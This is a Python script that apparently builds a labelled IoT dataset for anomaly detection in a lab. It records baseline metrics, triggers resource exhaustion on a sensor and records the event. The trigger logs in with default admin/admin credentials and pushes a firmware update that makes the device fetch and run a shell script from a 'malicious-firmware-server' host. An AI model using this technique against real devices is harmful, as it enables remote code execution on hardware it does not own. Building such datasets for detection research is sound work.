# generate_resource_exhaustion_dataset.py
import subprocess
import time
import os
import argparse
import requests
import json
from pathlib import Path
from data_collector import IoTDatasetCollector

def trigger_resource_exhaustion(sensor_host, sensor_port, duration):
    """
    Trigger a resource exhaustion vulnerability on the specified sensor
    
    This uses the existing firmware vulnerability you've implemented
    """
    print(f"Triggering resource exhaustion on {sensor_host}:{sensor_port}")
    
    # Prepare payload - this assumes you have a malicious firmware server running
    payload = {
        "firmware_url": "http://malicious-firmware-server:38888/medium_firmware.sh",
        "version": "1.2.3-EXPLOIT"
    }
    
    # Send the request to trigger resource exhaustion
    try:
        response = requests.post(
            f"http://{sensor_host}:{sensor_port}/firmware/update",
            json=payload,
            auth=("admin", "admin"),
            timeout=10
        )
        
        if response.status_code == 200:
            print("Resource exhaustion successfully triggered")
            return True
        elif response.status_code == 408:  # 408 Request Timeout
            print("Resource exhaustion triggered with timeout (expected behavior)")
            return True
        else:
            print(f"Failed to trigger resource exhaustion: {response.status_code}")
            print(response.text)
            return False
    except requests.exceptions.Timeout:
        print("Resource exhaustion triggered with timeout (expected behavior)")
        return True
    except requests.exceptions.ReadTimeout as e:
        if "HTTPConnectionPool" in str(e) and "Read timed out" in str(e):
            print("Resource exhaustion triggered with read timeout (expected behavior)")
            return True
        else:
            print(f"Error triggering resource exhaustion: {e}")
            return False
    except Exception as e:
        print(f"Error triggering resource exhaustion: {e}")
        return False

def generate_dataset(prometheus_url, output_dir, sensor_host, sensor_port, 
                     baseline_duration=180, event_duration=300, cooldown=180):
    """
    Generate a complete dataset with baseline and resource exhaustion data
    """
    # Create collector
    collector = IoTDatasetCollector(prometheus_url=prometheus_url, output_dir=output_dir)
    
    # Step 1: Collect baseline data
    print("\n=== Collecting Baseline Data ===")
    baseline_file = collector.start_collection("baseline", baseline_duration)
    
    # Step 2: Wait briefly
    time.sleep(10)
    
    # Step 3: Trigger resource exhaustion
    print("\n=== Triggering Resource Exhaustion ===")
    success = trigger_resource_exhaustion(sensor_host, sensor_port, event_duration)
    
    if not success:
        print("Failed to trigger resource exhaustion. Aborting data collection.")
        return
    
    # Step 4: Collect data during resource exhaustion
    print("\n=== Collecting Resource Exhaustion Data ===")
    exhaustion_file = collector.start_collection("resource_exhaustion", event_duration)
    
    # Step 5: Wait for cooldown
    print(f"\n=== Cooldown period ({cooldown} seconds) ===")
    time.sleep(cooldown)
    
    print("\n=== Dataset Generation Complete ===")
    print(f"Baseline data: {baseline_file}")
    print(f"Resource exhaustion data: {exhaustion_file}")
    
    # Create a metadata file linking the two datasets
    dataset_meta = {
        "dataset_type": "resource_exhaustion_comparison",
        "created_at": time.time(),
        "baseline_file": str(baseline_file),
        "event_file": str(exhaustion_file),
        "sensor_host": sensor_host,
        "sensor_port": sensor_port
    }
    
    meta_file = Path(output_dir) / f"resource_exhaustion_metadata_{int(time.time())}.json"
    with open(meta_file, 'w') as f:
        json.dump(dataset_meta, f, indent=2)
    
    print(f"Dataset metadata: {meta_file}")
    
    return {
        "baseline": baseline_file,
        "event": exhaustion_file,
        "metadata": meta_file
    }

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate resource exhaustion dataset")
    parser.add_argument("--sensor", default="temperature-sensor-01", help="Target sensor hostname")
    parser.add_argument("--port", type=int, default=12380, help="Target sensor port")
    parser.add_argument("--prometheus", default="http://localhost:9090", help="Prometheus URL")
    parser.add_argument("--output", default="datasets", help="Output directory")
    parser.add_argument("--baseline", type=int, default=180, help="Baseline duration in seconds")
    parser.add_argument("--duration", type=int, default=300, help="Event duration in seconds")
    
    args = parser.parse_args()
    
    generate_dataset(
        args.prometheus, 
        args.output, 
        args.sensor, 
        args.port,
        args.baseline,
        args.duration
    )